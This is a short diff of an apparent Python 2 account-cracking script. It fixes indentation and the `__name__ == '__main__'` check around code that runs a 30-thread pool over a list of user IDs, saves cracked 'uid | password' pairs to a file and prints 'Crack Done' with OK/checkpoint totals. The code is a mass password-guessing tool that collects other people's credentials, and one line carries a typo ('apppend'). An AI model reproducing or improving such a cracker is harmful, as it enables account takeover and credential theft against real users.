@@ -652,18 +652,18 @@ try:
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
                                             cps.apppend(uid + pass8)
-except:
+        except:
             pass
 
-p = ThreadPool(30)
-p.map(main, id)
-print 47 * '-'
-print ' \x1b[1;92mCrack Done'
-print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-print 47 * '-'
-raw_input(' \x1b[1;93mPress enter to back')
-auto_crack()
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \x1b[1;92mCrack Done'
+    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input(' \x1b[1;93mPress enter to back')
+    auto_crack()
 
 
-if _name_ == '_main_':
+if __name__ == '__main__':
     reg()
